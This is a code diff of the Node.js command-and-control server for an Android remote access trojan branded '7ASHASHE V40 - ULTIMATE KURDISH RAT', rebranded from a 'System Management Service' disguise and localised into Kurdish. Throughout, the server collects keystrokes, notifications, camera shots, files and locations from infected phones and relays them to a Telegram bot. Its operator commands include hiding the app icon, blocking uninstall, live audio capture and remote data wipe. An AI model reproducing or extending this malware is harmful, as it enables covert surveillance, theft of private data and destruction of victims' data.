+        country: req.headers.country || 'نەزانراو',
+        carrier: req.headers.carrier || 'نەزانراو'
+    };
+    
+    clients.set(clientId, { ws, info: clientInfo });
+    
+    const db = readDB();
+    db.clients[clientId] = clientInfo;
+    db.stats.total_connections++;
+    writeDB(db);
+    
+    bot.sendMessage(CONFIG.CHAT_ID,
+        `🔌 **ئامێری نوێ پەیوەندی کرد**\n\n` +
+        `📱 **مۆدێل:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
+        `📱 **ئەندرۆید:** ${clientInfo.androidVersion}\n` +
+        `🔋 **پاتری:** ${clientInfo.battery}\n` +
+        `💾 **RAM:** ${clientInfo.ram}\n` +
+        `📁 **Storage:** ${clientInfo.storage}\n` +
+        `🔓 **Root:** ${clientInfo.root}\n` +
+        `🌍 **وڵات:** ${clientInfo.country}\n` +
+        `🌐 **IP:** ${clientInfo.ip}\n` +
+        `🆔 **ئایدی:** ${clientId.substring(0, 8)}...`,
+        { parse_mode: 'Markdown' }
+    );
+    
+    ws.on('message', async (data) => {
+        try {
+            const message = JSON.parse(data);
+            clientInfo.lastSeen = new Date().toISOString();
+            
+            switch(message.type) {
+                case 'ping':
+                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
+                    break;
+                    
+                case 'notification':
+                    notificationListener.captureNotification(message.notification);
+                    break;
+                    
+                case 'keylog':
+                    smartKeylogger.logKey(clientId, message.key, message.app);
+                    break;
+                    
+                case 'screen_frame':
+                    const stream = screenStreamer.getActiveStreams().find(s => s.clientId === clientId);
+                    if (stream) {
+                        stream.frames++;
+                    }
+                    break;
+                    
+                case 'spam_progress':
+                    contactsSpam.updateProgress(message.spamId, message.sent, message.total);
+                    break;
+                    
+                case 'call_forwarded':
+                    const forward = callForwarding.forwardings.get(message.forwardId);
+                    if (forward) {
+                        forward.forwardedCalls++;
+                    }
+                    break;
+                    
+                case 'cam_snapshot':
+                    const filename = `cam_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
+                    const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
+                    const base64Data = message.image.replace(/^data:image\/jpeg;base64,/, '');
+                    fs.writeFileSync(filepath, base64Data, 'base64');
+                    
+                    bot.sendPhoto(CONFIG.CHAT_ID, Buffer.from(base64Data, 'base64'), {
+                        caption: `📸 **وێنەی کامێرا**\n\n` +
+                                `📱 ئامێر: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
+                                `⏰ کات: ${new Date().toLocaleString('ckb')}`,
+                        parse_mode: 'Markdown'
+                    });
+                    
+                    const db = readDB();
+                    db.stats.cam_snapshots++;
+                    writeDB(db);
+                    break;
+                    
+                case 'sim_changed':
+                    simChangeAlert.handleSimChange(clientId, message.simInfo);
+                    break;
+                    
+                case 'boot_complete':
+                    autoBoot.handleBootComplete(clientId);
+                    break;
+                    
+                default:
+                    console.log('Unknown message type:', message.type);
+            }
+        } catch (error) {
+            console.error('WebSocket message error:', error);
+        }
+    });
+    
+    ws.on('close', () => {
+        clients.delete(clientId);
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🔌 **ئامێر پەیوەندی پچڕاند**\n\n` +
+            `📱 مۆدێل: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
+    });
+    
+    ws.send(JSON.stringify({ type: 'init', clientId }));
+});
+
+// =====================================================
+// 🏠 WEB INTERFACE
 // =====================================================
 app.get('/', (req, res) => {
     const db = readDB();
@@ -1458,7 +1410,7 @@ app.get('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>System Management Service</title>
+            <title>7ASHASHE V40 - ULTIMATE KURDISH RAT</title>
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
                 body {
@@ -1526,33 +1478,51 @@ app.get('/', (req, res) => {
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>System Management Service</h1>
-                    <p>Real-time Device Monitoring</p>
-                    <p>Version: ${CONFIG.VERSION}</p>
+                    <h1>🔴 7ASHASHE V40</h1>
+                    <p>ULTIMATE KURDISH RAT</p>
+                    <p>👑 ${CONFIG.MASTER}</p>
+                    <p>🌐 پۆرت: ${CONFIG.PORT}</p>
                 </div>
                 
                 <div class="stats-grid">
                     <div class="stat-card">
                         <div class="stat-value">${clients.size}</div>
-                        <div>Connected Devices</div>
+                        <div>ئامێرە پەیوەستکراوەکان</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-value">${db.stats.notifications_captured || 0}</div>
-                        <div>Notifications</div>
+                        <div>نۆتیفیکەیشن دزراو</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-value">${screenStreamer.activeStreams}</div>
-                        <div>Active Streams</div>
+                        <div>Stream چالاک</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-value">${db.stats.cam_snapshots || 0}</div>
-                        <div>Snapshots</div>
+                        <div>وێنەی کامێرا</div>
                     </div>
                 </div>
                 
+                <div class="feature-grid">
+                    <div class="feature">🔄 ڕیستارتی خۆکار</div>
+                    <div class="feature">📱 گوێگرتنی نۆتیفیکەیشن</div>
+                    <div class="feature">📹 Streamی شاشە</div>
+                    <div class="feature">⌨️ کێڤلۆگەری زیرەک</div>
+                    <div class="feature">🚫 دژە-سڕینەوە</div>
+                    <div class="feature">👁️ شاردنەوەی ئایکۆن</div>
+                    <div class="feature">🎤 گوێگرتنی ڕاستەوخۆ</div>
+                    <div class="feature">📸 سکرینشۆتی زیرەک</div>
+                    <div class="feature">⚡ کۆنترۆڵی کامێرا</div>
+                    <div class="feature">🔋 دژە-باتری</div>
+                    <div class="feature">📱 ئاگاداری سیمکارت</div>
+                    <div class="feature">💥 سڕینەوەی دوور</div>
+                    <div class="feature">💬 پەیامی ساختە</div>
+                    <div class="feature">🔄 ڕیستارتی خۆکار</div>
+                </div>
+                
                 <div class="footer">
-                    <p>System Management Service v39.0</p>
-                    <p>Running on port ${CONFIG.PORT}</p>
+                    <p>7ASHASHE V40 - ULTIMATE KURDISH RAT</p>
+                    <p>🦁 💀 🔥</p>
                 </div>
             </div>
         </body>
@@ -1565,7 +1535,7 @@ app.get('/', (req, res) => {
 // =====================================================
 app.post('/upload/file', upload.single('file'), (req, res) => {
     try {
-        const { model, uuid, type, path: filePath } = req.headers;
+        const { model, uuid, type } = req.headers;
         const { originalname, buffer, size } = req.file;
         
         const fileName = `${Date.now()}_${originalname}`;
@@ -1582,11 +1552,11 @@ app.post('/upload/file', upload.single('file'), (req, res) => {
         fs.writeFileSync(savePath, buffer);
         
         bot.sendDocument(CONFIG.CHAT_ID, buffer, {
-            caption: `📁 **New File**\n\n` +
-                    `📱 Device: ${model || 'unknown'}\n` +
-                    `📄 Name: ${originalname}\n` +
-                    `📦 Size: ${(size / 1024).toFixed(2)}KB\n` +
-                    `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
+            caption: `📁 **فایلی نوێ**\n\n` +
+                    `📱 ئامێر: ${model || 'نەزانراو'}\n` +
+                    `📄 ناو: ${originalname}\n` +
+                    `📦 قەبارە: ${(size / 1024).toFixed(2)}KB\n` +
+                    `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
             parse_mode: 'Markdown'
         });
         
@@ -1601,9 +1571,9 @@ app.post('/upload/text', (req, res) => {
     const { text } = req.body;
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        `📝 **${type || 'Message'} from ${model || 'unknown'}**\n\n` +
+        `📝 **${type || 'پەیام'} لە ${model || 'نەزانراو'}**\n\n` +
         `${text}\n\n` +
-        `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
+        `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
         { parse_mode: 'Markdown' }
     );
     
@@ -1616,9 +1586,9 @@ app.post('/upload/location', (req, res) => {
     
     bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
     bot.sendMessage(CONFIG.CHAT_ID,
-        `📍 **Location from ${model || 'unknown'}**\n\n` +
+        `📍 **شوێنی ${model || 'نەزانراو'}**\n\n` +
         `Google Maps: https://maps.google.com/?q=${lat},${lon}\n` +
-        `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
+        `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
         { parse_mode: 'Markdown' }
     );
     
@@ -1626,140 +1596,26 @@ app.post('/upload/location', (req, res) => {
 });
 
 // =====================================================
-// 🔌 WEBSOCKET CONNECTION
-// =====================================================
-wss.on('connection', (ws, req) => {
-    const clientId = uuidv4();
-    const clientInfo = {
-        id: clientId,
-        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
-        userAgent: req.headers['user-agent'],
-        connectedAt: new Date().toISOString(),
-        lastSeen: new Date().toISOString(),
-        model: req.headers.model || 'unknown',
-        manufacturer: req.headers.manufacturer || 'unknown',
-        androidVersion: req.headers.android || 'unknown',
-        battery: req.headers.battery || 'unknown',
-        ram: req.headers.ram || 'unknown',
-        storage: req.headers.storage || 'unknown',
-        root: req.headers.root || 'unknown',
-        country: req.headers.country || 'unknown',
-        carrier: req.headers.carrier || 'unknown',
-        networkType: req.headers.network || 'unknown'
-    };
-    
-    clients.set(clientId, { ws, info: clientInfo });
-    
-    const db = readDB();
-    db.clients[clientId] = clientInfo;
-    db.stats.total_connections++;
-    writeDB(db);
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        `🔌 **New Device Connected**\n\n` +
-        `📱 **Model:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
-        `📱 **Android:** ${clientInfo.androidVersion}\n` +
-        `🔋 **Battery:** ${clientInfo.battery}\n` +
-        `💾 **RAM:** ${clientInfo.ram}\n` +
-        `📁 **Storage:** ${clientInfo.storage}\n` +
-        `🔓 **Root:** ${clientInfo.root}\n` +
-        `🌍 **Country:** ${clientInfo.country}\n` +
-        `🌐 **IP:** ${clientInfo.ip}\n` +
-        `🆔 **ID:** ${clientId.substring(0, 8)}...`,
-        { parse_mode: 'Markdown' }
-    );
-    
-    ws.on('message', async (data) => {
-        try {
-            const message = JSON.parse(data);
-            clientInfo.lastSeen = new Date().toISOString();
-            
-            switch(message.type) {
-                case 'ping':
-                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
-                    break;
-                    
-                case 'data':
-                    const { dataType, content } = message;
-                    logToFile(dataType, { clientId, content });
-                    break;
-                    
-                case 'notification':
-                    notificationListener.captureNotification(message.notification);
-                    break;
-                    
-                case 'keylog':
-                    smartKeylogger.logKey(clientId, message.key, message.app);
-                    break;
-                    
-                case 'screen_frame':
-                    const stream = screenStreamer.getActiveStreams().find(s => s.clientId === clientId);
-                    if (stream) {
-                        stream.frames++;
-                    }
-                    break;
-                    
-                case 'spam_progress':
-                    contactsSpam.updateProgress(message.spamId, message.sent, message.total);
-                    break;
-                    
-                case 'call_forwarded':
-                    const forward = callForwarding.forwardings.get(message.forwardId);
-                    if (forward) {
-                        forward.forwardedCalls++;
-                    }
-                    break;
-                    
-                case 'cam_snapshot':
-                    camSnapshotOnLock.saveSnapshot(clientId, message.image);
-                    break;
-                    
-                case 'file_list':
-                    remoteFileExplorer.handleFileList(clientId, message.files);
-                    break;
-                    
-                default:
-                    console.log('Unknown message type:', message.type);
-            }
-        } catch (error) {
-            console.error('WebSocket message error:', error);
-        }
-    });
-    
-    ws.on('close', () => {
-        clients.delete(clientId);
-        
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `🔌 **Device Disconnected**\n\n` +
-            `📱 Model: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
-            `🆔 ID: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
-        );
-    });
-    
-    ws.send(JSON.stringify({ type: 'init', clientId }));
-});
-
-// =====================================================
-// 🤖 TELEGRAM BOT - BASIC COMMANDS
+// 🤖 TELEGRAM BOT - فەرمانە سەرەکییەکان
 // =====================================================
 bot.onText(/\/start/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
-        bot.sendMessage(msg.chat.id, '⛔ Access Denied');
+        bot.sendMessage(msg.chat.id, '⛔ **ڕێگەپێدان نەدرا**');
         return;
     }
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        '🔴 **System Management Service**\n\n' +
-        '✅ Ready\n\n' +
-        '📱 **devices** - Show connected devices\n' +
-        '📊 **stats** - System statistics\n' +
-        '⚡ **commands** - Available commands',
+        '🔴 **7ASHASHE V40 - ULTIMATE KURDISH RAT**\n\n' +
+        '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
+        '📱 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
+        '📊 **ئامار** - ئامارەکانی سیستەم\n' +
+        '⚡ **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n' +
+        '🔧 **پێشکەوتوو** - فەرمانە پێشکەوتووەکان',
         {
             reply_markup: {
                 keyboard: [
-                    ['📱 devices', '📊 stats'],
-                    ['⚡ commands']
+                    ['📱 ئامێرەکان', '📊 ئامار'],
+                    ['⚡ فەرمانەکان', '🔧 پێشکەوتوو']
                 ],
                 resize_keyboard: true
             }
@@ -1767,45 +1623,49 @@ bot.onText(/\/start/, (msg) => {
     );
 });
 
-bot.onText(/📱 devices/, (msg) => {
+bot.onText(/📱 ئامێرەکان/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
     
     if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ No devices connected');
+        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
         return;
     }
     
-    let text = '📱 **Connected Devices**\n\n';
+    let text = '📱 **ئامێرە پەیوەستکراوەکان**\n\n';
     clients.forEach((client, id) => {
-        text += `📱 **Model:** ${client.info.manufacturer} ${client.info.model}\n` +
-                `🔋 **Battery:** ${client.info.battery}\n` +
-                `🆔 **ID:** ${id.substring(0, 8)}...\n\n`;
+        text += `📱 **مۆدێل:** ${client.info.manufacturer} ${client.info.model}\n` +
+                `🔋 **پاتری:** ${client.info.battery}\n` +
+                `🌍 **وڵات:** ${client.info.country}\n` +
+                `🆔 **ئایدی:** ${id.substring(0, 8)}...\n\n`;
     });
     
     bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
 });
 
-bot.onText(/📊 stats/, (msg) => {
+bot.onText(/📊 ئامار/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
     
     const db = readDB();
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        `📊 **System Statistics**\n\n` +
-        `📱 Connected Devices: ${clients.size}\n` +
-        `📸 Total Snapshots: ${db.stats.cam_snapshots || 0}\n` +
-        `📱 Notifications: ${db.stats.notifications_captured || 0}\n` +
-        `📹 Active Streams: ${screenStreamer.activeStreams}\n` +
-        `⏱️ Uptime: ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
+        `📊 **ئامارەکانی سیستەم**\n\n` +
+        `📱 ئامێرە پەیوەستکراوەکان: ${clients.size}\n` +
+        `📸 وێنە دزراوەکان: ${db.stats.cam_snapshots || 0}\n` +
+        `📱 نۆتیفیکەیشن دزراوەکان: ${db.stats.notifications_captured || 0}\n` +
+        `📹 Stream چالاک: ${screenStreamer.activeStreams}\n` +
+        `🔑 کلیک تۆمارکراوەکان: ${smartKeylogger.logs.length}\n` +
+        `🚫 هەوڵی سڕینەوە: ${db.stats.anti_uninstall_attempts || 0}\n` +
+        `📱 گۆڕینی سیم: ${db.stats.sim_changes || 0}\n` +
+        `⏱️ ماوەی کارکردن: ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
         { parse_mode: 'Markdown' }
     );
 });
 
-bot.onText(/⚡ commands/, (msg) => {
+bot.onText(/⚡ فەرمانەکان/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
     
     if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ No devices connected');
+        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
         return;
     }
     
@@ -1817,9 +1677,28 @@ bot.onText(/⚡ commands/, (msg) => {
         }]);
     });
     
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **Select a device**', {
+    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە**', {
         reply_markup: { inline_keyboard: deviceKeyboard }
     });
+});
+
+bot.onText(/🔧 پێشکەوتوو/, (msg) => {
+    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
+    
+    bot.sendMessage(CONFIG.CHAT_ID,
+        '🔧 **فەرمانە پێشکەوتووەکان**\n\n' +
+        '📱 **دژە-سڕینەوە** - چالاککردنی سیستمی دژە-سڕینەوە\n' +
+        '👁️ **شاردنەوەی ئایکۆن** - ونکردنی ئایکۆنی ئەپەکە\n' +
+        '🎤 **گوێگرتنی ڕاستەوخۆ** - گوێگرتن لە دەنگ بۆ ماوەی دیاریکراو\n' +
+        '📸 **سکرینشۆتی زیرەک** - چاودێری کردنی ئەپێک\n' +
+        '⚡ **کۆنترۆڵی کامێرا** - وێنەگرتن بە کامێرا\n' +
+        '🔋 **دژە-باتری** - ناچالاککردنی پاشەکەوتکردنی وزە\n' +
+        '📱 **ئاگاداری سیمکارت** - ئاگاداربوون لە گۆڕینی سیم\n' +
+        '💥 **سڕینەوەی داتا** - سڕینەوەی دووری داتاکان\n' +
+        '💬 **پەیامی ساختە** - ناردنی پەیامی ساختە بۆ شاشە\n' +
+        '🔄 **ڕیستارتی خۆکار** - چالاککردنی ڕیستارتی خۆکار',
+        { parse_mode: 'Markdown' }
+    );
 });
 
 // =====================================================
@@ -1832,7 +1711,7 @@ bot.on('callback_query', (callbackQuery) => {
     if (command === 'device') {
         const client = clients.get(clientId);
         if (!client) {
-            bot.editMessageText('❌ Device disconnected', {
+            bot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
                 chat_id: msg.chat.id,
                 message_id: msg.message_id
             });
@@ -1841,50 +1720,50 @@ bot.on('callback_query', (callbackQuery) => {
         
         bot.editMessageText(
             `📱 **${client.info.manufacturer} ${client.info.model}**\n\n` +
-            `📱 Android: ${client.info.androidVersion}\n` +
-            `🔋 Battery: ${client.info.battery}\n` +
-            `🌍 Country: ${client.info.country}\n` +
+            `📱 ئەندرۆید: ${client.info.androidVersion}\n` +
+            `🔋 پاتری: ${client.info.battery}\n` +
+            `🌍 وڵات: ${client.info.country}\n` +
             `🌐 IP: ${client.info.ip}\n\n` +
-            `**Select command:**`,
+            `**⚡ فەرمانێک هەڵبژێرە:**`,
             {
                 chat_id: msg.chat.id,
                 message_id: msg.message_id,
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: '📸 Camera', callback_data: `camera:${clientId}` },
-                            { text: '🎤 Microphone', callback_data: `mic:${clientId}` }
+                            { text: '📸 کامێرا', callback_data: `camera:${clientId}` },
+                            { text: '🎤 مایک', callback_data: `mic:${clientId}` }
                         ],
                         [
-                            { text: '📍 Location', callback_data: `location:${clientId}` },
-                            { text: '📁 Files', callback_data: `files:${clientId}` }
+                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
+                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` }
                         ],
                         [
-                            { text: '📱 Notifications', callback_data: `notifications:${clientId}` },
-                            { text: '⌨️ Keylogger', callback_data: `keylogger:${clientId}` }
+                            { text: '📱 نۆتیفیکەیشن', callback_data: `notifications:${clientId}` },
+                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` }
                         ],
                         [
-                            { text: '📹 Screen Stream', callback_data: `screen:${clientId}` },
-                            { text: '📸 Cam Snapshot', callback_data: `cam_snapshot:${clientId}` }
+                            { text: '📹 Streamی شاشە', callback_data: `screen:${clientId}` },
+                            { text: '🎤 گوێگرتنی ڕاستەوخۆ', callback_data: `audio_stream:${clientId}` }
                         ],
                         [
-                            { text: '📞 Forward Calls', callback_data: `forward:${clientId}` },
-                            { text: '📨 Spam', callback_data: `spam:${clientId}` }
+                            { text: '👁️ شاردنەوەی ئایکۆن', callback_data: `hide_icon:${clientId}` },
+                            { text: '🔋 دژە-باتری', callback_data: `battery_bypass:${clientId}` }
                         ],
                         [
-                            { text: '📶 WiFi On', callback_data: `wifi_on:${clientId}` },
-                            { text: '📶 WiFi Off', callback_data: `wifi_off:${clientId}` }
+                            { text: '🚫 دژە-سڕینەوە', callback_data: `anti_uninstall:${clientId}` },
+                            { text: '💥 سڕینەوەی داتا', callback_data: `wipe:${clientId}` }
                         ],
                         [
-                            { text: '📱 Bluetooth On', callback_data: `bt_on:${clientId}` },
-                            { text: '📱 Bluetooth Off', callback_data: `bt_off:${clientId}` }
+                            { text: '📱 ئاگاداری سیمکارت', callback_data: `sim_alert:${clientId}` },
+                            { text: '💬 پەیامی ساختە', callback_data: `toast:${clientId}` }
                         ],
                         [
-                            { text: '🔓 Wake Up', callback_data: `wake:${clientId}` },
-                            { text: '🔒 Keep Screen', callback_data: `keep_screen:${clientId}` }
+                            { text: '📶 وایفای', callback_data: `wifi:${clientId}` },
+                            { text: '📱 بلوتوس', callback_data: `bluetooth:${clientId}` }
                         ],
                         [
-                            { text: '💥 Self Destruct', callback_data: `destruct:${clientId}` }
+                            { text: '🔄 ڕیستارتی خۆکار', callback_data: `auto_boot:${clientId}` }
                         ]
                     ]
                 },
@@ -1895,52 +1774,68 @@ bot.on('callback_query', (callbackQuery) => {
     
     const commandTypes = [
         'camera', 'mic', 'location', 'files', 'notifications',
-        'keylogger', 'screen', 'cam_snapshot', 'forward', 'spam',
-        'wifi_on', 'wifi_off', 'bt_on', 'bt_off', 'wake', 'keep_screen'
+        'keylogger', 'screen', 'audio_stream', 'hide_icon',
+        'battery_bypass', 'anti_uninstall', 'wipe', 'sim_alert',
+        'toast', 'wifi', 'bluetooth', 'auto_boot'
     ];
     
     if (commandTypes.includes(command)) {
         const client = clients.get(clientId);
         if (!client) {
             bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Device disconnected',
+                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
                 show_alert: true
             });
             return;
         }
         
         if (client.ws.readyState === WebSocket.OPEN) {
+            let wsCommand = command;
+            
+            // Convert to appropriate WebSocket command
+            const commandMap = {
+                'camera': 'take_photo',
+                'mic': 'record_audio',
+                'location': 'get_location',
+                'files': 'list_files',
+                'notifications': 'start_notifications',
+                'keylogger': 'start_keylogger',
+                'screen': 'start_screen_stream',
+                'audio_stream': 'start_audio_stream',
+                'hide_icon': 'hide_icon',
+                'battery_bypass': 'enable_battery_bypass',
+                'anti_uninstall': 'enable_anti_uninstall',
+                'wipe': 'wipe_data',
+                'sim_alert': 'enable_sim_alert',
+                'toast': 'show_toast',
+                'wifi': 'toggle_wifi',
+                'bluetooth': 'toggle_bluetooth',
+                'auto_boot': 'enable_auto_boot'
+            };
+            
             client.ws.send(JSON.stringify({
-                type: command,
+                type: commandMap[command] || command,
                 timestamp: Date.now()
             }));
             
             bot.answerCallbackQuery(callbackQuery.id, {
-                text: `✅ ${command} command sent`,
+                text: `✅ فەرمان نێردرا`,
                 show_alert: false
             });
             
             bot.sendMessage(CONFIG.CHAT_ID,
-                `✅ **Command Sent**\n\n` +
-                `📱 Device: ${client.info.manufacturer} ${client.info.model}\n` +
-                `⚡ Command: ${command}\n` +
-                `🕐 Time: ${new Date().toLocaleString()}`,
+                `✅ **فەرمان نێردرا**\n\n` +
+                `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+                `⚡ فەرمان: ${command}\n` +
+                `🕐 کات: ${new Date().toLocaleString('ckb')}`,
                 { parse_mode: 'Markdown' }
             );
         } else {
             bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Connection lost',
+                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
                 show_alert: true
             });
         }
-    }
-    
-    if (command === 'destruct') {
-        bot.sendMessage(CONFIG.CHAT_ID,
-            '💥 **⚠️ SELF-DESTRUCT ⚠️**\n\n' +
-            'Enter password to confirm:',
-            { reply_markup: { force_reply: true } }
-        );
     }
 });
 
@@ -1956,27 +1851,31 @@ setInterval(() => {
 }, CONFIG.PING_INTERVAL);
 
 // =====================================================
-// 🚀 INSTALL ALL MODULES
-// =====================================================
-setupAutoRestart();
-setupPersistentService();
-setupAccessibilityService();
-setupBatteryOptimizationBypass();
-setupAntiUninstall();
-
-// =====================================================
 // 🚀 START SERVER
 // =====================================================
 server.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log(`✅ Server running on port ${CONFIG.PORT}`);
+    console.log(`✅ 7ASHASHE V40 running on port ${CONFIG.PORT}`);
     console.log(`🌐 http://localhost:${CONFIG.PORT}`);
+    console.log(`🔥 ULTIMATE KURDISH RAT - ${CONFIG.MASTER}`);
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        `✅ **System Management Service Started**\n\n` +
-        `📊 Version: ${CONFIG.VERSION}\n` +
-        `🌐 Port: ${CONFIG.PORT}\n` +
-        `⏱️ Time: ${new Date().toLocaleString()}\n\n` +
-        `🦁 **Ready**`
+        `🔥 **7ASHASHE V40 - ULTIMATE KURDISH RAT**\n\n` +
+        `👑 **${CONFIG.MASTER}**\n` +
+        `📊 وەشان: ${CONFIG.VERSION}\n` +
+        `🌐 پۆرت: ${CONFIG.PORT}\n` +
+        `⏱️ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+        `✅ **١٠ تایبەتمەندی نوێ:**\n` +
+        `1. 🚫 دژە-سڕینەوە\n` +
+        `2. 👁️ شاردنەوەی ئایکۆن\n` +
+        `3. 🎤 گوێگرتنی ڕاستەوخۆ\n` +
+        `4. 📸 سکرینشۆتی زیرەک\n` +
+        `5. ⚡ کۆنترۆڵی کامێرا\n` +
+        `6. 🔋 دژە-باتری\n` +
+        `7. 📱 ئاگاداری سیمکارت\n` +
+        `8. 💥 سڕینەوەی دوور\n` +
+        `9. 💬 پەیامی ساختە\n` +
+        `10. 🔄 ڕیستارتی خۆکار\n\n` +
+        `🦁 **7ASHASHE**`
     );
 });
 
